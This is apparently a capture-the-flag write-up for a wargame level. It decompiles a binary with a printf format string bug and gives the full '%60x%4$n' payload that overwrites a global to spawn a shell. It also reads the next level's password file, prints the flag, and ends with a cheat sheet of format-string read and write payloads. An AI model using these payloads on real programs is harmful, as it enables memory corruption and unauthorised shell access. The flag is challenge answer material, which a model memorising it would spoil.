# 🎯 Level3 - Format String Vulnerability

![Helldivers Salute](https://media4.giphy.com/media/v1.Y2lkPTc5MGI3NjExejJwMnpmeXZ0dHp1enptbDE2am9la2Z4Ymg0eXczcmRiNzFqczJjMSZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/VJN5s9dNGXLDqkLYF4/giphy.gif)

Welcome to format string exploitation! 🎨

## 📋 Binary Analysis

### 🔍 Main Function (Ghidra)
```c
void main(void)
{
  v();
  return;
}
```

### 🎯 V Function (Decompiled)
```c
void v(void)
{
  char local_20c [520];
  
  fgets(local_20c, 0x200, stdin);
  printf(local_20c);              // ⚠️ FORMAT STRING VULNERABILITY!
  if (m == 0x40) {                // If m equals 64
    fwrite("Wait what?!\n", 1, 0xc, stdout);
    system("/bin/sh");            // Spawn shell!
  }
  return;
}
```

### 🔑 Global Variable
```asm
m                                    XREF[2]: Entry Point(*), v:080484da(R)  
0804988c    00 00 00 00    undefined4    00000000h
```

**Address of `m`**: `0x0804988c`

## 🚨 Vulnerability

### The Problem
```c
printf(local_20c);  // ❌ WRONG! No format specifier
```

**Should be**:
```c
printf("%s", local_20c);  // ✅ CORRECT
```

### What This Allows
- 🔍 **Memory disclosure**: Read values from the stack using `%x`, `%p`, `%s`
- ✍️ **Memory write**: Modify arbitrary memory using `%n`
- 🎯 **Goal**: Modify global variable `m` to equal `0x40` (64)

## 💣 Exploit Strategy

### Step 1: Find Stack Position 🔎
```bash
python -c 'print "AAAA" + "%x."*10' | ./level3
```

**Output**:
```
AAAA200.b7fd1ac0.b7ff37d0.41414141.252e7825.78252e78...
                            ^^^^^^^^
                         Position 4!
```

### Step 2: Understand Format String Primitives

| Specifier | Description |
|-----------|-------------|
| `%x` | Print hexadecimal from stack |
| `%p` | Print pointer from stack |
| `%s` | Print string from pointer on stack |
| `%n` | **Write** number of bytes printed to address on stack |
| `%4$n` | Write to 4th argument (direct parameter access) |

### Step 3: Calculate Payload 🧮

```
[Address: 4 bytes] + [Padding: 60 bytes] = 64 bytes total (0x40)
      ↓                    ↓                      ↓
 0x0804988c           %60x                    %4$n
```

**Breakdown**:
- `\x8c\x98\x04\x08` → Address of `m` (little-endian)
- `%60x` → Print 60 hex characters (padding)
- `%4$n` → Write byte count (64) to 4th stack position

### Step 4: Execute Exploit 💥
```bash
(python -c 'print "\x8c\x98\x04\x08" + "%60x%4$n"'; cat) | ./level3
```

**What Happens**:
1. Address of `m` is placed at stack position 4
2. `%60x` prints 60 characters → total bytes = 4 + 60 = 64
3. `%4$n` writes 64 to the address at position 4 (which is `m`)
4. `m == 0x40` condition is true → shell spawns! 🎉

### Step 5: Get the Flag 🚩
```bash
cat /home/user/level4/.pass
```

## 🔑 Key Concepts

| Concept | Description |
|---------|-------------|
| **Format String Bug** | Missing format specifier in printf family functions |
| **%n Specifier** | Writes number of bytes printed so far to memory |
| **Direct Parameter Access** | `%4$n` accesses 4th argument without traversing stack |
| **Stack Position** | Finding where your input appears on the stack |
| **Arbitrary Write** | Writing controlled values to arbitrary memory locations |

## 🎓 Learning Points

### Why This Works
1. ✅ `printf(buffer)` allows format string interpretation
2. ✅ Our input contains the **target address** + format specifiers
3. ✅ `%n` writes the **byte count** to the target address
4. ✅ We control the byte count through **padding**
5. ✅ Global variable `m` is modified to **64** (0x40)

### The Format String Write Primitive

```
Stack Layout:
┌─────────────────┐
│ ... stack data  │
├─────────────────┤
│  0xb7ff37d0     │ ← Position 3
├─────────────────┤
│  0x0804988c     │ ← Position 4 (our address of 'm')
└─────────────────┘

When printf executes "%4$n":
1. Looks at position 4 on stack
2. Finds address: 0x0804988c (address of 'm')
3. Writes byte count (64) to that address
4. m now equals 64!
```

### Format String Attack Types

| Attack | Specifier | Purpose |
|--------|-----------|---------|
| **Info Leak** | `%x`, `%p`, `%s` | Read memory/stack values |
| **Arbitrary Read** | `%s` with address | Read from specific memory |
| **Arbitrary Write** | `%n` with address | Write to specific memory |
| **GOT Overwrite** | `%n` to GOT entry | Redirect function calls |

## 🛡️ Security Mitigations

### Protections Bypassed
- ❌ No FORTIFY_SOURCE compilation flag
- ❌ No format string checking at compile time
- ❌ Global variable in writable data segment

### Modern Protections That Would Help
- 🛡️ **FORTIFY_SOURCE**: Compile-time format string checking
- 🛡️ **-Wformat-security**: Compiler warning for unsafe printf
- 🛡️ **RELRO**: Makes global variables read-only
- 🛡️ **Stack canaries**: Doesn't prevent this, but helps detect other issues

## 📊 Exploitation Diagram

```
Input: "\x8c\x98\x04\x08" + "%60x%4$n"
          └──┬──┘            └┬┘  └┬┘
             │                │    │
    Address of 'm'      Padding  Write!
             │                │    │
             ↓                ↓    ↓
Stack:   [0x0804988c]    [60 bytes printed]
                                   │
                                   ↓
Memory:  0x0804988c: 0x00000040 (64 decimal)
                          └┬┘
                           └→ Shell spawns! 🎉
```

## 🎯 Format String Cheat Sheet

```bash
# Find stack position
python -c 'print "AAAA" + "%x."*20' | ./binary

# Write small value (< 255)
python -c 'print "\xAA\xBB\xCC\xDD" + "%60x%4$n"' | ./binary

# Write larger value (use multiple writes)
python -c 'print "\xAA\xBB\xCC\xDD" + "%256x%4$n"' | ./binary

# Read from address
python -c 'print "\xAA\xBB\xCC\xDD" + "%4$s"' | ./binary
```

---

> 💡 **Pro Tip**: Always use `printf("%s", buffer)` instead of `printf(buffer)`!

> ⚠️ **Security Note**: Format string bugs were extremely common in the 90s/2000s and led to many exploits!

## 📚 References & Further Reading

### Academic Papers
- **[Exploiting Format String Vulnerabilities](https://cs155.stanford.edu/papers/formatstring-1.2.pdf)** (2001) - Stanford CS155  
  The seminal paper on format string exploitation by Tim Newsham

### Security Resources
- **[OWASP Format String Attack](https://owasp.org/www-community/attacks/Format_string_attack)**  
  Comprehensive guide to format string vulnerabilities and attacks

- **[Wikipedia: Format String Attack](https://en.wikipedia.org/wiki/Format_string_attack)**  
  Historical context and technical overview

### Exploit Techniques
- **Format String Parameter Types**: `%x` (read), `%s` (read string), `%n` (write)
- **Direct Parameter Access**: `%4$n` accesses 4th argument directly
- **Arbitrary Memory Write**: Combining address placement with `%n` specifier

## 🎉 Victory!

![Helldivers Celebration](https://media4.giphy.com/media/v1.Y2lkPTc5MGI3NjExempicnBhODF0Y3BrZG5zaWIzMmM2MWExdDZuYWNnYWJrdnRtYXg4MyZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/MlyicdUndRbn5zUiAL/giphy.gif)

**Flag captured!** 🚩

```
b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
```

**Difficulty**: ⭐⭐⭐ Intermediate - Format string exploitation!
